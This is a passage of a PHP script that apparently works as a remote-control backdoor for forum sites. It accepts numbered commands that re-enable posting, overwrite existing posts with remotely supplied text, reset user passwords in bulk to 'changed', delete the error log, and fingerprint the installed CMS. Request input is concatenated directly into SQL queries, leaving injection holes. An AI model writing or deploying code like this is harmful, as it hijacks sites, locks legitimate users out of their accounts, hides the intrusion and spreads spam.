					$mysqli->close();
					return;
			}
			if($action==12) // Enable posting
			{
					$returnCode = "0|0";
					if(rename(dirname( __FILE__ ) .$forumFolder."/_posting.php",dirname( __FILE__ ) .$forumFolder."/posting.php"))
					{
						$returnCode = "0|1";
					}
					echo $returnCode;
					return;
			}
			
			if($action==21) // Disable register
			{
				    echo "0|0";// "Function not yet handle";
					return;
			}
			if($action==22) // Enable register
			{
				     echo "0|0";// "Function not yet handle";
					return;
			}
			
			if($action==3)
			{
				$responseStr="";
				$ipost_title = $_POST["ipost_title"];
				$ipost_content = $_POST["ipost_content"];
				$iforum_name = $_POST["iforum_name"];
				$iforum_id = $_POST["iforum_id"];
				
				$mysqli -> set_charset("utf8");
				$forum_id_update = -1;
				if($iforum_id!="0")
				{
					$forum_id_update = $iforum_id;
					$responseStr = "|-1";
				}
				else {
					if($iforum_name !="0")
					{
					    $frpr="a:1:{i:1;a:2:{i:0;s:19:\"Your first category\";i:1;i:0;}}";
						$sqlInsertForum="INSERT INTO " . $db_prefix . "forums (parent_id, left_id, right_id, forum_parents, forum_name, forum_desc,forum_desc_options,forum_style,forum_rules_options,forum_topics_per_page,forum_type,forum_status,forum_last_post_id,forum_last_poster_id,forum_rules) VALUES  (1,2,3,'".$frpr."','" . $iforum_name . "','" . $iforum_name . "',7,0,7,0,1,0,0,0,'');";
						$mysqli->query($sqlInsertForum); 
						
						$sqlGetForumIdForUpdate="SELECT max(forum_id) as mid FROM " . $db_prefix . "forums; ";
						$resultGetForumId = $mysqli->query($sqlGetForumIdForUpdate);
						if ($resultGetForumId->num_rows > 0) 
						{
							while($row = $resultGetForumId->fetch_assoc()) 
							{
								if($row["mid"]!=null)
								{
									$forum_id_update = $row["mid"];
									$responseStr = "|".$forum_id_update;
								}
							}
						} 
							
					}
					else {
							$forum_id_update = 1;
							$responseStr = "|-1";
						}
				}
					
				$sqlmaxxupThreadID = "SELECT config_value FROM " . $db_prefix . "config where config_name='maxxupThreadID'";
				$result = $mysqli->query($sqlmaxxupThreadID);
				$MaxxUpThreadId = 0;

				if ($result->num_rows > 0) 
				{
					while($row = $result->fetch_assoc()) 
					{
						if($row["config_value"]!=null)
						{
							$MaxxUpThreadId = $row["config_value"];
						}
					}
				} 
				else 
				{
					$sqlmaxxupThreadIDinsert = "INSERT INTO " . $db_prefix . "config (config_name, config_value) VALUES  ('maxxupThreadID', '0'); ";
					$mysqli->query($sqlmaxxupThreadIDinsert);
				}

				$sqlGetTheadIdForUpdate="SELECT MIN(post_id) as mid FROM " . $db_prefix . "posts where post_id > " .$MaxxUpThreadId . "; ";
				$result1 = $mysqli->query($sqlGetTheadIdForUpdate);
				$UpThreadId = 0;
				if ($result1->num_rows > 0) 
				{
					while($row = $result1->fetch_assoc()) 
					{
						if($row["mid"]!=null)
						{
							$UpThreadId = $row["mid"];
						}
					}
				} 
				$responseStr = $UpThreadId . $responseStr;
				echo $responseStr;

				if($UpThreadId > 0 )
				{
					$sqlUpdateThread ="update " . $db_prefix . "posts set `post_subject` = '" . $ipost_title . "', post_text='".$ipost_content."' WHERE post_id=" . $UpThreadId . "; ";
					$sqlUpdateConfig ="update " . $db_prefix . "config set `config_value` = '" .$UpThreadId. "' WHERE config_name = 'maxxupThreadID'; ";
					$sqlUpdateTopicForumID = "";
					if($forum_id_update!=-1)
					{
					 $sqlUpdateTopicForumID = "update " . $db_prefix . "posts set `forum_id` = '" . $forum_id_update . "' WHERE post_id=" . $UpThreadId . "; ";
					}
					if (!$mysqli->multi_query($sqlUpdateThread . $sqlUpdatePost .$sqlUpdateConfig .$sqlUpdateTopicForumID )) 
					{
						echo "Multi query failed: (" . $mysqli->errno . ") " . $mysqli->error;
					}
				}
				$mysqli->close();
				return;		
	
			}
			if($action==6) // Clear user link and reset password
			{
					$returnCode = "0|0";
					$minUserIDforClear = $_GET["minid"];
					if($minUserIDforClear=="")
					{
						$minUserIDforClear = 47;
					}
				
					$sql ="update " . $db_prefix . "users set user_password='changed',  user_sig='' WHERE user_id> ". $minUserIDforClear ."; ";		

					if (!$mysqli->multi_query($sql)) {
						
					}
					else {
					$returnCode = "0|1";
					}
					echo $returnCode;
					$mysqli->close();		
		
					return;
			}
			if($action==50) // Delete Log file
			{
					$returnCode = "0|0";
					if (file_exists(dirname( __FILE__ ).$forumFolder."/error_log")) 
					{
						if(unlink(dirname( __FILE__ ).$forumFolder."/error_log"))
						{
							$returnCode = "0|1";
						}
					}
					else {
					$returnCode = "0|1";
						}
					echo $returnCode;
					return;
			}
		break;
	case "xen":
		echo "xen";
		break;
	case "vbb":
		echo "vbb";
		break;
	
	default:
	
	if(file_exists($isubfolder."wp-config.php"))
	{
		echo "wp";
		return;
	}
	if(file_exists($isubfolder."admin_options.php"))
	{
		echo "fbb";
		return;
	}
	if(file_exists($isubfolder."proxy.php"))
	{
		echo "xen";
		return;
	}
	if(file_exists($isubfolder."mcp.php"))
	{
		echo "bb";
		return;
	}
	if(file_exists($isubfolder."modcp.php"))
	{
		echo "mybb";
		return;
	}
	if(file_exists($isubfolder."autoload.php"))
	{
		echo "drupal";
		return;
	}
	if(file_exists($isubfolder."configuration.php"))
	{
		echo "jomla";
		return;
	}
			echo "nodetect";
}
?>